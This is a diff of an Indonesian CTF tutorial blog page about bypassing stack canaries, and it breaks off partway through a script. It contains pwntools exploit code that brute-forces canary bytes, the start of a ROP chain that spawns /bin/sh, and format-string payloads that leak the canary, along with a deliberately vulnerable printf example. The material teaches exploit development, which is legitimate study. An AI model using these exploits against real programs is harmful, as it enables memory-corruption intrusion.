@@ -40,23 +40,67 @@
 
   
   
-    <meta name="description" content="1. Apa Itu Bit dan Byte?
-Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+    <meta name="description" content="Apa itu Stack Canary?
+Stack canary adalah mekanisme keamanan yang ditempatkan di stack untuk mendeteksi buffer overflow. Namanya berasal dari analogi &ldquo;canary in a coal mine&rdquo; - jika canary mati, ada bahaya.
+Cara Kerja:
 
-1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
-1 Byte = Kumpulan 8 bit (contoh: 01011010).
+Setup: Saat fungsi dipanggil, nilai random (canary) ditempatkan di stack antara buffer dan return address
+Verification: Sebelum fungsi kembali, nilai canary diperiksa
+Detection: Jika nilai berubah, program terminate dengan segfault
 
-1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
-Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
+Layout Stack dengan Canary:
+High Addresses
+&#43;-----------------&#43;
+| Return Address  |
+&#43;-----------------&#43;
+| Saved EBP       |
+&#43;-----------------&#43;
+| Stack Canary    | ← Canary ditempatkan di sini
+&#43;-----------------&#43;
+| Local Variables |
+| (termasuk buffer)|
+&#43;-----------------&#43;
+Low Addresses
+2. Tools dan Analisis
+Tools yang Digunakan:
 
+GDB dengan Pwndbg: Debugger dengan enhancement untuk exploit development
+Pwntools: Python library untuk CTF exploits
+Checksec: Untuk melihat proteksi binary
+Objdump: Untuk melihat assembly code
 
-
-Contoh:
-
-00000000 (binary) = 0 (decimal)
-11111111 (binary) = 255 (decimal)
-
-Kesimpulan:">
+Contoh Output Pwndbg:
+$ gdb ./vulnerable_program
+pwndbg&gt; checksec
+[*] &#39;/home/user/vulnerable_program&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+pwndbg&gt; disassemble vulnerable_function
+Dump of assembler code for function vulnerable_function:
+   0x080484db &lt;&#43;0&gt;:     push   ebp
+   0x080484dc &lt;&#43;1&gt;:     mov    ebp,esp
+   0x080484de &lt;&#43;3&gt;:     sub    esp,0x28
+   0x080484e1 &lt;&#43;6&gt;:     mov    eax,gs:0x14
+   0x080484e7 &lt;&#43;12&gt;:    mov    DWORD PTR [ebp-0xc],eax  ; Canary disimpan di [ebp-0xc]
+   0x080484ea &lt;&#43;15&gt;:    xor    eax,eax
+   0x080484ec &lt;&#43;17&gt;:    sub    esp,0x4
+   0x080484ef &lt;&#43;20&gt;:    push   0x100
+   0x080484f4 &lt;&#43;25&gt;:    lea    eax,[ebp-0x2c]
+   0x080484f7 &lt;&#43;28&gt;:    push   eax
+   0x080484f8 &lt;&#43;29&gt;:    push   0x0
+   0x080484fa &lt;&#43;31&gt;:    call   0x80483a0 &lt;read@plt&gt;
+   0x080484ff &lt;&#43;36&gt;:    add    esp,0x10
+   0x08048502 &lt;&#43;39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048505 &lt;&#43;42&gt;:    xor    eax,gs:0x14
+   0x0804850c &lt;&#43;49&gt;:    je     0x8048513 &lt;vulnerable_function&#43;56&gt;
+   0x0804850e &lt;&#43;51&gt;:    call   0x80483c0 &lt;__stack_chk_fail@plt&gt;
+   0x08048513 &lt;&#43;56&gt;:    leave  
+   0x08048514 &lt;&#43;57&gt;:    ret    
+End of assembler dump.
+Yang perlu dipahami dari output:">
   
 
   <title>
@@ -78,40 +122,128 @@ Kesimpulan:">
   
 
   
-    <meta name="description" content="1. Apa Itu Bit dan Byte?
-Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+    <meta name="description" content="Apa itu Stack Canary?
+Stack canary adalah mekanisme keamanan yang ditempatkan di stack untuk mendeteksi buffer overflow. Namanya berasal dari analogi &ldquo;canary in a coal mine&rdquo; - jika canary mati, ada bahaya.
+Cara Kerja:
 
-1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
-1 Byte = Kumpulan 8 bit (contoh: 01011010).
+Setup: Saat fungsi dipanggil, nilai random (canary) ditempatkan di stack antara buffer dan return address
+Verification: Sebelum fungsi kembali, nilai canary diperiksa
+Detection: Jika nilai berubah, program terminate dengan segfault
 
-1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
-Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
+Layout Stack dengan Canary:
+High Addresses
+&#43;-----------------&#43;
+| Return Address  |
+&#43;-----------------&#43;
+| Saved EBP       |
+&#43;-----------------&#43;
+| Stack Canary    | ← Canary ditempatkan di sini
+&#43;-----------------&#43;
+| Local Variables |
+| (termasuk buffer)|
+&#43;-----------------&#43;
+Low Addresses
+2. Tools dan Analisis
+Tools yang Digunakan:
 
+GDB dengan Pwndbg: Debugger dengan enhancement untuk exploit development
+Pwntools: Python library untuk CTF exploits
+Checksec: Untuk melihat proteksi binary
+Objdump: Untuk melihat assembly code
 
+Contoh Output Pwndbg:
+$ gdb ./vulnerable_program
+pwndbg&gt; checksec
+[*] &#39;/home/user/vulnerable_program&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+pwndbg&gt; disassemble vulnerable_function
+Dump of assembler code for function vulnerable_function:
+   0x080484db &lt;&#43;0&gt;:     push   ebp
+   0x080484dc &lt;&#43;1&gt;:     mov    ebp,esp
+   0x080484de &lt;&#43;3&gt;:     sub    esp,0x28
+   0x080484e1 &lt;&#43;6&gt;:     mov    eax,gs:0x14
+   0x080484e7 &lt;&#43;12&gt;:    mov    DWORD PTR [ebp-0xc],eax  ; Canary disimpan di [ebp-0xc]
+   0x080484ea &lt;&#43;15&gt;:    xor    eax,eax
+   0x080484ec &lt;&#43;17&gt;:    sub    esp,0x4
+   0x080484ef &lt;&#43;20&gt;:    push   0x100
+   0x080484f4 &lt;&#43;25&gt;:    lea    eax,[ebp-0x2c]
+   0x080484f7 &lt;&#43;28&gt;:    push   eax
+   0x080484f8 &lt;&#43;29&gt;:    push   0x0
+   0x080484fa &lt;&#43;31&gt;:    call   0x80483a0 &lt;read@plt&gt;
+   0x080484ff &lt;&#43;36&gt;:    add    esp,0x10
+   0x08048502 &lt;&#43;39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048505 &lt;&#43;42&gt;:    xor    eax,gs:0x14
+   0x0804850c &lt;&#43;49&gt;:    je     0x8048513 &lt;vulnerable_function&#43;56&gt;
+   0x0804850e &lt;&#43;51&gt;:    call   0x80483c0 &lt;__stack_chk_fail@plt&gt;
+   0x08048513 &lt;&#43;56&gt;:    leave  
+   0x08048514 &lt;&#43;57&gt;:    ret    
+End of assembler dump.
+Yang perlu dipahami dari output:">
+    <meta property="og:description" content="Apa itu Stack Canary?
+Stack canary adalah mekanisme keamanan yang ditempatkan di stack untuk mendeteksi buffer overflow. Namanya berasal dari analogi &ldquo;canary in a coal mine&rdquo; - jika canary mati, ada bahaya.
+Cara Kerja:
 
-Contoh:
+Setup: Saat fungsi dipanggil, nilai random (canary) ditempatkan di stack antara buffer dan return address
+Verification: Sebelum fungsi kembali, nilai canary diperiksa
+Detection: Jika nilai berubah, program terminate dengan segfault
 
-00000000 (binary) = 0 (decimal)
-11111111 (binary) = 255 (decimal)
+Layout Stack dengan Canary:
+High Addresses
+&#43;-----------------&#43;
+| Return Address  |
+&#43;-----------------&#43;
+| Saved EBP       |
+&#43;-----------------&#43;
+| Stack Canary    | ← Canary ditempatkan di sini
+&#43;-----------------&#43;
+| Local Variables |
+| (termasuk buffer)|
+&#43;-----------------&#43;
+Low Addresses
+2. Tools dan Analisis
+Tools yang Digunakan:
 
-Kesimpulan:">
-    <meta property="og:description" content="1. Apa Itu Bit dan Byte?
-Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+GDB dengan Pwndbg: Debugger dengan enhancement untuk exploit development
+Pwntools: Python library untuk CTF exploits
+Checksec: Untuk melihat proteksi binary
+Objdump: Untuk melihat assembly code
 
-1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
-1 Byte = Kumpulan 8 bit (contoh: 01011010).
-
-1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
-Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
-
-
-
-Contoh:
-
-00000000 (binary) = 0 (decimal)
-11111111 (binary) = 255 (decimal)
-
-Kesimpulan:">
+Contoh Output Pwndbg:
+$ gdb ./vulnerable_program
+pwndbg&gt; checksec
+[*] &#39;/home/user/vulnerable_program&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+pwndbg&gt; disassemble vulnerable_function
+Dump of assembler code for function vulnerable_function:
+   0x080484db &lt;&#43;0&gt;:     push   ebp
+   0x080484dc &lt;&#43;1&gt;:     mov    ebp,esp
+   0x080484de &lt;&#43;3&gt;:     sub    esp,0x28
+   0x080484e1 &lt;&#43;6&gt;:     mov    eax,gs:0x14
+   0x080484e7 &lt;&#43;12&gt;:    mov    DWORD PTR [ebp-0xc],eax  ; Canary disimpan di [ebp-0xc]
+   0x080484ea &lt;&#43;15&gt;:    xor    eax,eax
+   0x080484ec &lt;&#43;17&gt;:    sub    esp,0x4
+   0x080484ef &lt;&#43;20&gt;:    push   0x100
+   0x080484f4 &lt;&#43;25&gt;:    lea    eax,[ebp-0x2c]
+   0x080484f7 &lt;&#43;28&gt;:    push   eax
+   0x080484f8 &lt;&#43;29&gt;:    push   0x0
+   0x080484fa &lt;&#43;31&gt;:    call   0x80483a0 &lt;read@plt&gt;
+   0x080484ff &lt;&#43;36&gt;:    add    esp,0x10
+   0x08048502 &lt;&#43;39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048505 &lt;&#43;42&gt;:    xor    eax,gs:0x14
+   0x0804850c &lt;&#43;49&gt;:    je     0x8048513 &lt;vulnerable_function&#43;56&gt;
+   0x0804850e &lt;&#43;51&gt;:    call   0x80483c0 &lt;__stack_chk_fail@plt&gt;
+   0x08048513 &lt;&#43;56&gt;:    leave  
+   0x08048514 &lt;&#43;57&gt;:    ret    
+End of assembler dump.
+Yang perlu dipahami dari output:">
     <meta property="og:image" content="/path/to/default-image.jpg">
     <meta name="twitter:image" content="/path/to/default-image.jpg">
 
@@ -119,23 +251,67 @@ Kesimpulan:">
   <meta property="og:url" content="/posts/stack-canary-bf/">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Bypass Stack Canary - Pwn03">
-  <meta name="twitter:description" content="1. Apa Itu Bit dan Byte?
-Sebelum memahami stack canary, kita perlu mengerti dasar-dasar bit dan byte:
+  <meta name="twitter:description" content="Apa itu Stack Canary?
+Stack canary adalah mekanisme keamanan yang ditempatkan di stack untuk mendeteksi buffer overflow. Namanya berasal dari analogi &ldquo;canary in a coal mine&rdquo; - jika canary mati, ada bahaya.
+Cara Kerja:
 
-1 Bit = Nilai terkecil dalam komputasi (0 atau 1).
-1 Byte = Kumpulan 8 bit (contoh: 01011010).
+Setup: Saat fungsi dipanggil, nilai random (canary) ditempatkan di stack antara buffer dan return address
+Verification: Sebelum fungsi kembali, nilai canary diperiksa
+Detection: Jika nilai berubah, program terminate dengan segfault
 
-1 Byte bisa menyimpan nilai dari 0 sampai 255 (total 256 kemungkinan).
-Kenapa 256? Karena 2^8 = 256 (8 bit = 256 kombinasi).
+Layout Stack dengan Canary:
+High Addresses
+&#43;-----------------&#43;
+| Return Address  |
+&#43;-----------------&#43;
+| Saved EBP       |
+&#43;-----------------&#43;
+| Stack Canary    | ← Canary ditempatkan di sini
+&#43;-----------------&#43;
+| Local Variables |
+| (termasuk buffer)|
+&#43;-----------------&#43;
+Low Addresses
+2. Tools dan Analisis
+Tools yang Digunakan:
 
+GDB dengan Pwndbg: Debugger dengan enhancement untuk exploit development
+Pwntools: Python library untuk CTF exploits
+Checksec: Untuk melihat proteksi binary
+Objdump: Untuk melihat assembly code
 
-
-Contoh:
-
-00000000 (binary) = 0 (decimal)
-11111111 (binary) = 255 (decimal)
-
-Kesimpulan:">
+Contoh Output Pwndbg:
+$ gdb ./vulnerable_program
+pwndbg&gt; checksec
+[*] &#39;/home/user/vulnerable_program&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+pwndbg&gt; disassemble vulnerable_function
+Dump of assembler code for function vulnerable_function:
+   0x080484db &lt;&#43;0&gt;:     push   ebp
+   0x080484dc &lt;&#43;1&gt;:     mov    ebp,esp
+   0x080484de &lt;&#43;3&gt;:     sub    esp,0x28
+   0x080484e1 &lt;&#43;6&gt;:     mov    eax,gs:0x14
+   0x080484e7 &lt;&#43;12&gt;:    mov    DWORD PTR [ebp-0xc],eax  ; Canary disimpan di [ebp-0xc]
+   0x080484ea &lt;&#43;15&gt;:    xor    eax,eax
+   0x080484ec &lt;&#43;17&gt;:    sub    esp,0x4
+   0x080484ef &lt;&#43;20&gt;:    push   0x100
+   0x080484f4 &lt;&#43;25&gt;:    lea    eax,[ebp-0x2c]
+   0x080484f7 &lt;&#43;28&gt;:    push   eax
+   0x080484f8 &lt;&#43;29&gt;:    push   0x0
+   0x080484fa &lt;&#43;31&gt;:    call   0x80483a0 &lt;read@plt&gt;
+   0x080484ff &lt;&#43;36&gt;:    add    esp,0x10
+   0x08048502 &lt;&#43;39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048505 &lt;&#43;42&gt;:    xor    eax,gs:0x14
+   0x0804850c &lt;&#43;49&gt;:    je     0x8048513 &lt;vulnerable_function&#43;56&gt;
+   0x0804850e &lt;&#43;51&gt;:    call   0x80483c0 &lt;__stack_chk_fail@plt&gt;
+   0x08048513 &lt;&#43;56&gt;:    leave  
+   0x08048514 &lt;&#43;57&gt;:    ret    
+End of assembler dump.
+Yang perlu dipahami dari output:">
 </head>
 
 
@@ -168,293 +344,945 @@ Kesimpulan:">
 
     
 
-    <h2 id="1-apa-itu-bit-dan-byte"><strong>1. Apa Itu Bit dan Byte?</strong></h2>
-<p>Sebelum memahami <strong>stack canary</strong>, kita perlu mengerti dasar-dasar <strong>bit</strong> dan <strong>byte</strong>:</p>
-<ul>
-<li><strong>1 Bit</strong> = Nilai terkecil dalam komputasi (<code>0</code> atau <code>1</code>).</li>
-<li><strong>1 Byte</strong> = Kumpulan <strong>8 bit</strong> (contoh: <code>01011010</code>).
-<ul>
-<li><strong>1 Byte bisa menyimpan nilai dari <code>0</code> sampai <code>255</code></strong> (total <strong>256 kemungkinan</strong>).</li>
-<li>Kenapa <strong>256</strong>? Karena <code>2^8 = 256</code> (8 bit = 256 kombinasi).</li>
-</ul>
-</li>
-</ul>
-<p>Contoh:</p>
-<ul>
-<li><code>00000000</code> (binary) = <code>0</code> (decimal)</li>
-<li><code>11111111</code> (binary) = <code>255</code> (decimal)</li>
-</ul>
-<p><strong>Kesimpulan:</strong></p>
-<ul>
-<li><strong>1 Byte = 8 Bit = Nilai 0-255 (total 256 kemungkinan).</strong></li>
-<li><strong>Nilai 256 dipakai karena itu batas maksimal 1 byte.</strong></li>
-</ul>
-<hr>
-<h2 id="2-apa-itu-stack-canary"><strong>2. Apa Itu Stack Canary?</strong></h2>
-<p><strong>Stack Canary</strong> adalah nilai rahasia (random) di stack yang berfungsi seperti &ldquo;alarm&rdquo; untuk mendeteksi <strong>buffer overflow</strong>.</p>
-<ul>
-<li>
-<p><strong>Ukuran Canary:</strong></p>
-<ul>
-<li><strong>32-bit program</strong> → Canary = <strong>4 byte</strong> (contoh: <code>0xefbead00</code>)</li>
-<li><strong>64-bit program</strong> → Canary = <strong>8 byte</strong> (contoh: <code>0xdeadbeefcafeb00</code>)</li>
-</ul>
-</li>
-<li>
-<p><strong>Cara Kerja:</strong></p>
-<ul>
-<li>Jika ada <strong>buffer overflow</strong>, canary akan <strong>tertimpa</strong> sebelum return address.</li>
-<li>Sebelum fungsi selesai (<code>ret</code>), program mengecek apakah canary masih utuh.</li>
-<li>Jika <strong>berubah</strong> → Program crash (<code>*** stack smashing detected ***</code>).</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="3-kenapa-brute-force-canary-menggunakan"><strong>3. Kenapa Brute-Force Canary Menggunakan <code>range(256)</code>?</strong></h2>
-<p>Karena <strong>setiap byte canary bisa bernilai <code>0</code> sampai <code>255</code> (total 256 kemungkinan)</strong>, kita perlu mencoba semua kemungkinan byte tersebut.</p>
-<h3 id="contoh-brute-force-canary-32-bit"><strong>Contoh Brute-Force Canary (32-bit)</strong></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)  <span style="color:#0f0"># Program 32-bit (canary 4 byte)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;&#34;</span>  <span style="color:#0f0"># Inisialisasi canary kosong</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># Brute-force 3 byte pertama (byte ke-4 = \x00)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">3</span>):  <span style="color:#0f0"># 3 byte pertama</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> byte in range(<span style="color:#f60">256</span>):  <span style="color:#0f0"># Coba semua nilai byte (0-255)</span>
-</span></span><span style="display:flex;"><span>        payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span>*offset + canary + bytes([byte])
-</span></span><span style="display:flex;"><span>        p.sendline(payload)
-</span></span><span style="display:flex;"><span>        <span style="color:#f00">if</span> <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;stack smashing&#34;</span> not in p.recv():  <span style="color:#0f0"># Jika tidak crash, byte benar</span>
-</span></span><span style="display:flex;"><span>            canary += bytes([byte])  <span style="color:#0f0"># Tambahkan byte yang benar</span>
-</span></span><span style="display:flex;"><span>            print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Found byte </span><span style="color:#87ceeb">{</span>i+<span style="color:#f60">1</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">: </span><span style="color:#87ceeb">{</span>hex(byte)<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#f00">break</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>canary += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\x00</span><span style="color:#87ceeb">&#34;</span>  <span style="color:#0f0"># Tambahkan null byte terakhir (byte ke-4)</span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Full canary: </span><span style="color:#87ceeb">{</span>hex(u32(canary))<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)  <span style="color:#0f0"># Output: 0xefbead00 (misal)</span>
-</span></span></code></pre></div><h3 id="penjelasan-kode"><strong>Penjelasan Kode:</strong></h3>
+    <h3 id="apa-itu-stack-canary">Apa itu Stack Canary?</h3>
+<p>Stack canary adalah mekanisme keamanan yang ditempatkan di stack untuk mendeteksi buffer overflow. Namanya berasal dari analogi &ldquo;canary in a coal mine&rdquo; - jika canary mati, ada bahaya.</p>
+<h3 id="cara-kerja">Cara Kerja:</h3>
 <ol>
-<li><strong><code>for byte in range(256)</code></strong>
-<ul>
-<li>Mencoba <strong>semua nilai byte (0-255)</strong> untuk menemukan byte yang benar.</li>
-</ul>
-</li>
-<li><strong><code>bytes([byte])</code></strong>
-<ul>
-<li>Mengubah angka (misal <code>255</code>) menjadi byte (<code>\xff</code>).</li>
-</ul>
-</li>
-<li><strong><code>canary += b&quot;\x00&quot;</code></strong>
-<ul>
-<li>Byte terakhir canary biasanya <code>\x00</code> (null byte), jadi tidak perlu ditebak.</li>
-</ul>
-</li>
+<li><strong>Setup</strong>: Saat fungsi dipanggil, nilai random (canary) ditempatkan di stack antara buffer dan return address</li>
+<li><strong>Verification</strong>: Sebelum fungsi kembali, nilai canary diperiksa</li>
+<li><strong>Detection</strong>: Jika nilai berubah, program terminate dengan segfault</li>
 </ol>
-<hr>
-<h2 id="4-penerapan-brute-force-canary-dalam-exploit"><strong>4. Penerapan Brute-Force Canary dalam Exploit</strong></h2>
-<p>Setelah dapat <strong>canary</strong>, kita bisa lanjutkan eksploitasi dengan <strong>Return-Oriented Programming (ROP)</strong> atau <strong>Ret2Libc</strong>.</p>
-<h3 id="contoh-payload-setelah-dapat-canary-32-bit"><strong>Contoh Payload Setelah Dapat Canary (32-bit)</strong></h3>
+<h3 id="layout-stack-dengan-canary">Layout Stack dengan Canary:</h3>
+<pre tabindex="0"><code>High Addresses
++-----------------+
+| Return Address  |
++-----------------+
+| Saved EBP       |
++-----------------+
+| Stack Canary    | ← Canary ditempatkan di sini
++-----------------+
+| Local Variables |
+| (termasuk buffer)|
++-----------------+
+Low Addresses
+</code></pre><h2 id="2-tools-dan-analisis">2. Tools dan Analisis</h2>
+<h3 id="tools-yang-digunakan">Tools yang Digunakan:</h3>
+<ul>
+<li><strong>GDB dengan Pwndbg</strong>: Debugger dengan enhancement untuk exploit development</li>
+<li><strong>Pwntools</strong>: Python library untuk CTF exploits</li>
+<li><strong>Checksec</strong>: Untuk melihat proteksi binary</li>
+<li><strong>Objdump</strong>: Untuk melihat assembly code</li>
+</ul>
+<h3 id="contoh-output-pwndbg">Contoh Output Pwndbg:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./vulnerable_program
+</span></span><span style="display:flex;"><span>pwndbg&gt; checksec
+</span></span><span style="display:flex;"><span>[*] <span style="color:#87ceeb">&#39;/home/user/vulnerable_program&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     i386-32-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x8048000)
+</span></span></code></pre></div><pre tabindex="0"><code>pwndbg&gt; disassemble vulnerable_function
+Dump of assembler code for function vulnerable_function:
+   0x080484db &lt;+0&gt;:     push   ebp
+   0x080484dc &lt;+1&gt;:     mov    ebp,esp
+   0x080484de &lt;+3&gt;:     sub    esp,0x28
+   0x080484e1 &lt;+6&gt;:     mov    eax,gs:0x14
+   0x080484e7 &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax  ; Canary disimpan di [ebp-0xc]
+   0x080484ea &lt;+15&gt;:    xor    eax,eax
+   0x080484ec &lt;+17&gt;:    sub    esp,0x4
+   0x080484ef &lt;+20&gt;:    push   0x100
+   0x080484f4 &lt;+25&gt;:    lea    eax,[ebp-0x2c]
+   0x080484f7 &lt;+28&gt;:    push   eax
+   0x080484f8 &lt;+29&gt;:    push   0x0
+   0x080484fa &lt;+31&gt;:    call   0x80483a0 &lt;read@plt&gt;
+   0x080484ff &lt;+36&gt;:    add    esp,0x10
+   0x08048502 &lt;+39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048505 &lt;+42&gt;:    xor    eax,gs:0x14
+   0x0804850c &lt;+49&gt;:    je     0x8048513 &lt;vulnerable_function+56&gt;
+   0x0804850e &lt;+51&gt;:    call   0x80483c0 &lt;__stack_chk_fail@plt&gt;
+   0x08048513 &lt;+56&gt;:    leave  
+   0x08048514 &lt;+57&gt;:    ret    
+End of assembler dump.
+</code></pre><p><strong>Yang perlu dipahami dari output:</strong></p>
+<ul>
+<li><code>mov eax,gs:0x14</code> - Mengambil canary dari Thread Local Storage</li>
+<li><code>mov DWORD PTR [ebp-0xc],eax</code> - Menyimpan canary di stack</li>
+<li><code>xor eax,gs:0x14</code> - Memverifikasi canary sebelum return</li>
+<li><code>je 0x8048513</code> - Jump jika canary valid</li>
+<li><code>call __stack_chk_fail@plt</code> - Terminate program jika canary corrupt</li>
+</ul>
+<h1 id="3-metode-bypass-canary-32-bit">3. Metode Bypass Canary 32-bit</h1>
+<h1 id="a-format-string-exploit-untuk-leak-canary">A. Format String Exploit untuk Leak Canary</h1>
+<p>Format string vulnerability terjadi ketika programmer menggunakan fungsi printf-style (printf, sprintf, fprintf, dll.) dengan parameter yang tidak terkontrol, memungkinkan attacker membaca dan menulis memory secara arbitrary.</p>
+<h3 id="fungsi-vulnerable">Fungsi Vulnerable:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// VULNERABLE - user mengontrol format string
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">printf</span>(user_input);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// AMAN - format string dikontrol programmer
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;%s&#34;</span>, user_input);
+</span></span></code></pre></div><h3 id="mengapa-format-string-bisa-membaca-memory">Mengapa Format String Bisa Membaca Memory?</h3>
+<p>Pada implementasi C, fungsi printf membaca parameter dari stack sesuai dengan specifier yang diberikan:</p>
+<ul>
+<li><code>%x</code> - membaca 4 byte dari stack sebagai hexadecimal</li>
+<li><code>%p</code> - membaca pointer dari stack</li>
+<li><code>%s</code> - membaca string dari alamat yang ada di stack</li>
+<li><code>%n</code> - menulis jumlah byte yang telah di-output ke alamat yang ada di stack</li>
+</ul>
+<h2 id="2-teori-leak-canary-via-format-string">2. Teori Leak Canary via Format String</h2>
+<h3 id="layout-stack-saat-printf-dipanggil">Layout Stack saat printf Dipanggil:</h3>
+<pre tabindex="0"><code>+-----------------+
+| ...             |
++-----------------+
+| Format String   | ← Alamat format string (biasanya di stack juga)
++-----------------+
+| Arg1            | ← Parameter pertama untuk format specifier
++-----------------+
+| Arg2            | ← Parameter kedua
++-----------------+
+| ...             |
++-----------------+
+| Canary Value    | ← Nilai canary yang ingin kita leak
++-----------------+
+| ...             |
++-----------------+
+</code></pre><h3 id="cara-kerja-leak">Cara Kerja Leak:</h3>
+<ol>
+<li>Ketika kita mengirim <code>%n$p</code>, printf akan membaca nilai ke-n dari stack</li>
+<li>Canary biasanya berada di posisi tertentu di stack</li>
+<li>Dengan mencoba offset berbeda, kita bisa menemukan posisi canary</li>
+</ol>
+<h2 id="3-metodologi-lengkap-leak-canary">3. Metodologi Lengkap Leak Canary</h2>
+<h3 id="langkah-1-identifikasi-vulnerability">Langkah 1: Identifikasi Vulnerability</h3>
+<p>Cari code pattern seperti:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff0">printf</span>(input);  <span style="color:#0f0">// Langsung tanpa format string
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">printf</span>(buf);    <span style="color:#0f0">// Buffer mungkin mengandung user input
+</span></span></span></code></pre></div><h3 id="langkah-2-fuzzing-offset">Langkah 2: Fuzzing Offset</h3>
+<p>Kirim payload seperti <code>AAAA.%1$p.%2$p.%3$p...</code> untuk memetakan stack:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
-</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">64</span>  <span style="color:#0f0"># Ganti dengan offset yang benar</span>
-</span></span><span style="display:flex;"><span>canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\xef\xbe\xad\x00</span><span style="color:#87ceeb">&#34;</span>  <span style="color:#0f0"># Canary yang sudah ditemukan</span>
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./vulnerable&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#0f0"># ROP chain untuk call system(&#34;/bin/sh&#34;)</span>
-</span></span><span style="display:flex;"><span>rop = ROP(<span style="color:#87ceeb">&#34;./binary32&#34;</span>)
-</span></span><span style="display:flex;"><span>rop.call(<span style="color:#87ceeb">&#34;system&#34;</span>, [next(libc.search(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;/bin/sh&#34;</span>))])
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload = (
-</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span> * offset +  <span style="color:#0f0"># Isi buffer</span>
-</span></span><span style="display:flex;"><span>    canary +         <span style="color:#0f0"># Canary yang benar</span>
